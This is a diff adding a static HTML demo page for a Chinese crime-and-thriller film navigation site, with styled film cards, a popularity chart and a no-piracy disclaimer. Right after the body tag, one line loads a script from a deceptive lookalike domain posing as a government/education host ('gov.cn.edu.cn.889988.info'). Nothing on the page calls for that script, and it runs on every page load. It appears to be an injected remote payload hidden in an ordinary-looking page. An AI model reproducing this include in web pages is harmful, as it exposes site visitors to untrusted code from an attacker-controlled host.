@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>毒蛇电影网 - 硬核犯罪与暗黑高分电影导航 | dushedianyingwang-h5.github.io</title>
+<meta name="description" content="毒蛇电影网（dushedianyingwang-h5.github.io）是暗黑/犯罪/惊悚影视导航演示站：毒牙热映、黑色遗产、毒蛇热度榜、蛰伏预约，移动端自适应，纯静态页面，不提供盗版资源。" />
+<meta name="keywords" content="毒蛇电影网,dushedianyingwang-h5,犯罪电影,惊悚电影,黑帮片,高分暗黑电影,影视导航" />
+<link rel="canonical" href="https://dushedianyingwang-h5.github.io/" />
+<style>
+:root{
+  --poison:#39ff14;--poison-dim:#1f8f12;--ink:#0a0e0a;--ink2:#0f150f;
+  --blood:#ff2d55;--blood-dim:#7a1024;--teal:#0f3d2e;--teal-line:rgba(57,255,20,.22);
+  --paper:#e8ffe0;--gray:#7fae8a;--maxw:1180px;--radius:16px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(120% 80% at 90% -10%,rgba(255,45,85,.18),transparent 45%),
+    radial-gradient(120% 80% at 0% 0%,rgba(57,255,20,.14),transparent 40%),
+    var(--ink);
+  color:var(--paper);line-height:1.8;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+/* 蛇形分隔 */
+.snake-line{height:6px;background:repeating-linear-gradient(90deg,var(--poison) 0 18px,transparent 18px 30px,var(--blood) 30px 40px,transparent 40px 56px);opacity:.6;margin:0}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(10,14,10,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--teal-line)}
+.nav{display:flex;align-items:center;gap:14px;height:62px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:19px;color:var(--paper);letter-spacing:1px}
+.logo .fang{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,var(--poison),var(--blood));display:flex;align-items:center;justify-content:center;font-size:16px;box-shadow:0 0 18px rgba(57,255,20,.5)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:500;letter-spacing:1px}
+.menu{margin-left:auto;display:flex;gap:4px;flex-wrap:wrap}
+.menu a{padding:7px 13px;font-size:13px;color:var(--gray);border-radius:999px;transition:.2s}
+.menu a:hover{background:rgba(57,255,20,.12);color:var(--poison)}
+.search{display:flex;gap:6px}
+.search input{width:148px;padding:7px 14px;border-radius:999px;border:1px solid var(--teal-line);background:var(--ink2);color:var(--paper);outline:none;font-size:13px}
+.search button{border:0;padding:7px 15px;border-radius:999px;cursor:pointer;font-weight:800;background:var(--poison);color:#04210a;font-size:13px}
+.burger{display:none;margin-left:auto;background:var(--ink2);border:1px solid var(--teal-line);color:var(--poison);border-radius:9px;padding:6px 11px;font-size:17px}
+
+/* hero */
+.hero{margin:22px 0;border-radius:22px;overflow:hidden;background:linear-gradient(135deg,#0f150f,#0f3d2e 55%,#1a0510);border:1px solid var(--teal-line);min-height:340px;display:flex;align-items:center;position:relative}
+.hero::after{content:"🐍";position:absolute;right:5%;top:50%;transform:translateY(-50%) rotate(-8deg);font-size:130px;filter:drop-shadow(0 0 24px rgba(57,255,20,.55));opacity:.9}
+.hero-body{position:relative;z-index:2;padding:42px 38px;max-width:660px}
+.kick{display:inline-block;font-size:11px;letter-spacing:4px;color:var(--poison);border:1px solid rgba(57,255,20,.4);padding:4px 12px;border-radius:999px;margin-bottom:14px}
+.hero h1{font-size:38px;margin:0 0 10px;line-height:1.18}
+.hero h1 em{font-style:normal;color:var(--blood);text-shadow:0 0 18px rgba(255,45,85,.6)}
+.hero p{color:#bfe9c8;font-size:15px;margin:0 0 22px}
+.cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{border:0;cursor:pointer;padding:10px 22px;border-radius:999px;font-weight:800;font-size:13px;transition:.25s}
+.btn-poison{background:var(--poison);color:#04210a}
+.btn-poison:hover{box-shadow:0 0 22px rgba(57,255,20,.6);transform:translateY(-2px)}
+.btn-blood{background:transparent;border:2px solid var(--blood);color:#ff8aa0}
+.btn-blood:hover{background:rgba(255,45,85,.12)}
+
+.section{padding:32px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;margin:0}
+.sec-head h2::before{content:"🐍 ";}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--poison);font-size:12px;font-weight:700}
+
+/* 毒牙热映 */
+.fangs{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.fang-card{border-radius:18px;overflow:hidden;background:var(--ink2);border:1px solid var(--teal-line);transition:.25s;position:relative}
+.fang-card:hover{transform:translateY(-4px);border-color:var(--poison);box-shadow:0 16px 40px rgba(57,255,20,.12)}
+.fang-cover{aspect-ratio:16/9;padding:16px;display:flex;flex-direction:column;justify-content:space-between;position:relative}
+.fang-card:nth-child(1) .fang-cover{background:linear-gradient(135deg,#1a0510,#7a1024)}
+.fang-card:nth-child(2) .fang-cover{background:linear-gradient(135deg,#0f3d2e,#39ff14)}
+.fang-card:nth-child(3) .fang-cover{background:linear-gradient(135deg,#0a0e0a,#0f3d2e)}
+.fang-card:nth-child(4) .fang-cover{background:linear-gradient(135deg,#220a16,#ff2d55)}
+.fang-card:nth-child(5) .fang-cover{background:linear-gradient(135deg,#06281c,#39ff14)}
+.fang-card:nth-child(6) .fang-cover{background:linear-gradient(135deg,#101010,#7a1024)}
+.fang-cover .rate{background:rgba(0,0,0,.5);color:var(--poison);font-weight:900;font-size:13px;padding:3px 10px;border-radius:999px;align-self:flex-start}
+.fang-cover h3{margin:0;font-size:18px;color:#fff}
+.fang-body{padding:12px 14px}
+.fang-body .row{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px}
+.fang-body .row span{font-size:11px;padding:2px 9px;border-radius:999px;background:rgba(57,255,20,.1);color:var(--poison)}
+.fang-body p{margin:0;font-size:12px;color:var(--gray);line-height:1.6}
+.fang-body .act{margin-top:10px;display:flex;gap:8px}
+.fang-body .act button{flex:1;padding:7px 0;border-radius:999px;font-weight:800;font-size:12px;cursor:pointer;border:0}
+.act-watch{background:var(--poison);color:#04210a}
+.act-wish{background:transparent;border:1px solid var(--blood)!important;color:#ff8aa0}
+
+/* 分类 */
+.genres{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.genre{border:1px solid var(--teal-line);border-radius:14px;padding:18px 14px;background:var(--ink2);transition:.25s}
+.genre:hover{transform:translateY(-3px);background:rgba(57,255,20,.06)}
+.genre .ico{font-size:22px}
+.genre h3{margin:8px 0 4px;font-size:15px;color:var(--paper)}
+.genre p{margin:0;font-size:12px;color:var(--gray)}
+
+/* 热度榜 */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.rank-row{display:flex;align-items:center;gap:12px;background:var(--ink2);border:1px solid var(--teal-line);border-radius:14px;padding:12px 14px}
+.rank-no{font-size:20px;font-weight:900;color:var(--blood);width:34px;text-align:center}
+.rank-no.top{color:var(--poison);text-shadow:0 0 12px rgba(57,255,20,.6)}
+.rank-info{flex:1}
+.rank-info h4{margin:0;font-size:14px}
+.rank-info span{font-size:11px;color:var(--gray)}
+.rank-heat{font-size:12px;color:var(--poison);font-weight:800}
+
+/* 黑色遗产 */
+.legacy{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.leg-card{border-radius:16px;overflow:hidden;background:var(--ink2);border:1px solid var(--teal-line)}
+.leg-cover{aspect-ratio:3/4;padding:14px;display:flex;align-items:flex-end}
+.leg-card:nth-child(1) .leg-cover{background:linear-gradient(160deg,#101010,#ff2d55)}
+.leg-card:nth-child(2) .leg-cover{background:linear-gradient(160deg,#0f3d2e,#39ff14)}
+.leg-card:nth-child(3) .leg-cover{background:linear-gradient(160deg,#1a0510,#7a1024)}
+.leg-card:nth-child(4) .leg-cover{background:linear-gradient(160deg,#06281c,#0f3d2e)}
+.leg-cover h4{margin:0;color:#fff;font-size:15px}
+.leg-body{padding:12px}
+.leg-body .score{color:var(--poison);font-weight:900;font-size:14px}
+.leg-body p{margin:4px 0 0;font-size:12px;color:var(--gray)}
+
+/* 蛰伏预约 */
+.soon{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.soon-card{border-radius:18px;padding:20px;background:linear-gradient(135deg,var(--ink2),#0f3d2e);border:1px solid var(--teal-line)}
+.soon-card .when{font-size:11px;font-weight:800;color:var(--blood);letter-spacing:1px}
+.soon-card h3{margin:8px 0;font-size:17px}
+.soon-card p{font-size:12px;color:var(--gray);margin:0 0 14px}
+.soon-card button{padding:8px 18px;border-radius:999px;background:transparent;border:1px solid var(--poison);color:var(--poison);font-weight:800;font-size:12px;cursor:pointer}
+.soon-card button:hover{background:rgba(57,255,20,.1)}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px}
+.card{border:1px solid var(--teal-line);border-radius:18px;padding:22px;background:var(--ink2)}
+.card h3{margin:0 0 10px;color:var(--poison)}
+.card p,.card li{font-size:13px;color:var(--gray);line-height:1.9}
+.card ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:12px;margin-top:14px}
+.stat{flex:1;text-align:center;padding:14px;border-radius:14px;background:var(--ink);border:1px solid var(--teal-line)}
+.stat b{display:block;font-size:22px;color:var(--blood)}
+.stat span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid var(--teal-line);padding:26px 0 42px;color:var(--gray);font-size:12px;text-align:center;line-height:2}
+footer.site a{color:var(--poison)}
+code{background:var(--ink2);border:1px solid var(--teal-line);padding:2px 8px;border-radius:6px;color:var(--poison);font-size:11px}
+
+@media (max-width:980px){
+  .fangs{grid-template-columns:1fr 1fr}
+  .genres{grid-template-columns:1fr 1fr}
+  .rank{grid-template-columns:1fr}
+  .legacy{grid-template-columns:1fr 1fr}
+  .soon{grid-template-columns:1fr}
+}
+@media (max-width:720px){
+  .menu{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:var(--ink);border-bottom:1px solid var(--teal-line);padding:10px 16px;gap:4px}
+  .menu.open{display:flex}
+  .burger{display:block}
+  .search input{width:108px}
+  .hero h1{font-size:27px}
+  .hero::after{font-size:84px;opacity:.35}
+  .fangs,.genres,.legacy{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="snake-line"></div>
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="fang">🐍</div>
+      <div>毒蛇电影网<small>dushedianyingwang-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">毒牙首页</a>
+      <a href="#fangs">毒牙热映</a>
+      <a href="#genres">毒蛇分类</a>
+      <a href="#rank">毒蛇热度榜</a>
+      <a href="#legacy">黑色遗产</a>
+      <a href="#soon">蛰伏预约</a>
+      <a href="#about">关于毒蛇</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="搜犯罪/惊悚/黑帮" aria-label="搜索" />
+      <button type="button" onclick="alert('演示站：搜索用 # 占位')">噬</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home" aria-label="毒蛇电影网首屏">
+    <div class="hero-body">
+      <div class="kick">VENOM NOIR · CRIME / THRILLER</div>
+      <h1>不喂糖水片，<br/>只放<em>有毒</em>的好电影</h1>
+      <p>毒蛇电影网——犯罪、惊悚、黑帮、心理悬疑、影史暗黑经典。像蛇一样蛰伏，像毒牙一样精准：不吵闹，但一口见血。</p>
+      <div class="cta">
+        <button class="btn btn-poison" onclick="location.href='#fangs'">露出毒牙</button>
+        <button class="btn btn-blood" onclick="location.href='#legacy'">看黑色遗产</button>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="fangs">
+    <div class="sec-head"><h2>毒牙热映</h2><span>Venom Now</span><a class="more" href="#">全部 #</a></div>
+    <div class="fangs">
+      <div class="fang-card">
+        <div class="fang-cover"><span class="rate">★ 8.6</span><h3>冰血浮城</h3></div>
+        <div class="fang-body">
+          <div class="row"><span>犯罪</span><span>黑色幽默</span></div>
+          <p>极寒小镇，一具冻尸牵出整座城的谎话。</p>
+          <div class="act"><button class="act-watch">立即观看</button><button class="act-wish">想看</button></div>
+        </div>
+      </div>
+      <div class="fang-card">
+        <div class="fang-cover"><span class="rate">★ 7.9</span><h3>沉默猎手</h3></div>
+        <div class="fang-body">
+          <div class="row"><span>惊悚</span><span>心理</span></div>
+          <p>审讯室里没有凶手，只有两个都不肯闭嘴的人。</p>
+          <div class="act"><button class="act-watch">立即观看</button><button class="act-wish">想看</button></div>
+        </div>
+      </div>
+      <div class="fang-card">
+        <div class="fang-cover"><span class="rate">★ 8.2</span><h3>夜行帮规</h3></div>
+        <div class="fang-body">
+          <div class="row"><span>黑帮</span><span>港风</span></div>
+          <p>义字当头，刀字收尾；老大退位夜，全城重新洗牌。</p>
+          <div class="act"><button class="act-watch">立即观看</button><button class="act-wish">想看</button></div>
+        </div>
+      </div>
+      <div class="fang-card">
+        <div class="fang-cover"><span class="rate">★ 7.5</span><h3>毒液合同</h3></div>
+        <div class="fang-body">
+          <div class="row"><span>动作</span><span>谍战</span></div>
+          <p>一份合同比子弹贵，杀手比律师守信用。</p>
+          <div class="act"><button class="act-watch">立即观看</button><button class="act-wish">想看</button></div>
+        </div>
+      </div>
+      <div class="fang-card">
+        <div class="fang-cover"><span class="rate">★ 8.0</span><h3>厄舍之家</h3></div>
+        <div class="fang-body">
+          <div class="row"><span>哥特</span><span>恐怖</span></div>
+          <p>爱伦·坡的房子会呼吸，每扇门后都住着一个家族秘密。</p>
+          <div class="act"><button class="act-watch">立即观看</button><button class="act-wish">想看</button></div>
+        </div>
+      </div>
+      <div class="fang-card">
+        <div class="fang-cover"><span class="rate">★ 7.7</span><h3>锈刃</h3></div>
+        <div class="fang-body">
+          <div class="row"><span>西部</span><span>复仇</span></div>
+          <p>铁轨尽头的镇子，没人记得法律，只记得谁先拔刀。</p>
+          <div class="act"><button class="act-watch">立即观看</button><button class="act-wish">想看</button></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="genres">
+    <div class="sec-head"><h2>毒蛇分类</h2><span>Venom Genres</span><a class="more" href="#">全部 #</a></div>
+    <div class="genres">
+      <div class="genre"><div class="ico">🔪</div><h3>硬核犯罪</h3><p>抢劫、卧底、黑吃黑</p></div>
+      <div class="genre"><div class="ico">🩸</div><h3>心理惊悚</h3><p>记忆、偏执、反转</p></div>
+      <div class="genre"><div class="ico">🎩</div><h3>黑帮史诗</h3><p>家族、义气、权位</p></div>
+      <div class="genre"><div class="ico">🕯️</div><h3>哥特恐怖</h3><p>古宅、诅咒、血统</p></div>
+      <div class="genre"><div class="ico">🚬</div><h3>黑色电影</h3><p>雨夜、私探、香烟</p></div>
+      <div class="genre"><div class="ico">🧪</div><h3>毒液科幻</h3><p>寄生、变异、实验</p></div>
+      <div class="genre"><div class="ico">🚔</div><h3>警匪对决</h3><p>追车、线人、埋伏</p></div>
+      <div class="genre"><div class="ico">🎭</div><h3>暗黑剧情</h3><p>堕落、救赎、代价</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head"><h2>毒蛇热度榜</h2><span>Venom Chart</span><a class="more" href="#">完整榜单 #</a></div>
+    <div class="rank">
+      <div class="rank-row"><div class="rank-no top">1</div><div class="rank-info"><h4>冰血浮城</h4><span>犯罪 / 黑色幽默</span></div><div class="rank-heat">356.2万</div></div>
+      <div class="rank-row"><div class="rank-no top">2</div><div class="rank-info"><h4>厄舍之家</h4><span>哥特 / 恐怖</span></div><div class="rank-heat">334.7万</div></div>
+      <div class="rank-row"><div class="rank-no top">3</div><div class="rank-info"><h4>沉默猎手</h4><span>心理 / 惊悚</span></div><div class="rank-heat">298.3万</div></div>
+      <div class="rank-row"><div class="rank-no">4</div><div class="rank-info"><h4>夜行帮规</h4><span>黑帮 / 港风</span></div><div class="rank-heat">276.4万</div></div>
+      <div class="rank-row"><div class="rank-no">5</div><div class="rank-info"><h4>毒液合同</h4><span>动作 / 谍战</span></div><div class="rank-heat">253.9万</div></div>
+      <div class="rank-row"><div class="rank-no">6</div><div class="rank-info"><h4>锈刃</h4><span>西部 / 复仇</span></div><div class="rank-heat">231.0万</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="legacy">
+    <div class="sec-head"><h2>黑色遗产</h2><span>Dark Heritage</span><a class="more" href="#">更多 #</a></div>
+    <div class="legacy">
+      <div class="leg-card"><div class="leg-cover"><h4>七宗罪</h4></div><div class="leg-body"><div class="score">★ 8.8</div><p>七桩罪，七种死法，一座不信神的城市。</p></div></div>
+      <div class="leg-card"><div class="leg-cover"><h4>低俗小说</h4></div><div class="leg-body"><div class="score">★ 8.9</div><p>杀手、拳手、黑帮太太，时间被打乱重讲。</p></div></div>
+      <div class="leg-card"><div class="leg-cover"><h4>沉默的羔羊</h4></div><div class="leg-body"><div class="score">★ 8.9</div><p>最礼貌的恶魔，和最年轻的探员对视。</p></div></div>
+      <div class="leg-card"><div class="leg-cover"><h4>无间道</h4></div><div class="leg-body"><div class="score">★ 9.3</div><p>警察进黑帮，黑帮进警队，谁都回不去。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="soon">
+    <div class="sec-head"><h2>蛰伏预约</h2><span>Hibernating Soon</span><a class="more" href="#">全部 #</a></div>
+    <div class="soon">
+      <div class="soon-card"><div class="when">⏳ 14 天后噬咬</div><h3>猎人克莱文</h3><p>猎人、猛兽、执念——毒蛇系反派单独出场。</p><button>预约提醒</button></div>
+      <div class="soon-card"><div class="when">⏳ 24 天后噬咬</div><h3>小丑：二重笑</h3><p>疯子不一定杀人，但一定会让全城发笑到发抖。</p><button>预约提醒</button></div>
+      <div class="soon-card"><div class="when">⏳ 29 天后噬咬</div><h3>沙丘：毒 desert</h3><p>香料、虫族、权谋，沙漠里最贵的不是水而是背叛。</p><button>预约提醒</button></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于毒蛇</h2><span>About Venom Cinema</span></div>
+    <div class="about">
+      <div class="card">
+        <h3>毒蛇电影网是什么？</h3>
+        <p>毒蛇电影网（dushedianyingwang-h5.github.io）是一个暗黑 / 犯罪 / 惊悚向的影视导航演示站。它不追求“全家欢”，而是把犯罪片、黑帮片、心理惊悚、哥特恐怖、影史暗黑经典收进同一窝里。</p>
+        <div class="stats">
+          <div class="stat"><b>6</b><span>毒牙热映</span></div>
+          <div class="stat"><b>8</b><span>毒蛇分类</span></div>
+          <div class="stat"><b>100%</b><span>移动端适配</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <h3>演示边界</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库</li>
+          <li>所有播放 / 详情 / 分类链接均为 <code>#</code></li>
+          <li>不提供盗版资源、不挂解析、不碰侵权片源</li>
+          <li>必应友好：唯一 H1、canonical 自指向</li>
+          <li>不生成 robots.txt / sitemap.xml</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    毒蛇电影网 · <a href="https://dushedianyingwang-h5.github.io/">dushedianyingwang-h5.github.io</a><br/>
+    演示页面：所有播放 / 详情 / 分类链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 毒蛇电影网 Demo · 暗黑 / 犯罪 / 惊悚影视导航演示
+  </div>
+</footer>
+
+<script>
+  const burger=document.getElementById('burger'),menu=document.getElementById('menu');
+  burger.addEventListener('click',()=>menu.classList.toggle('open'));
+  menu.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>menu.classList.remove('open')));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  }));
+</script>
+</body>
+</html>
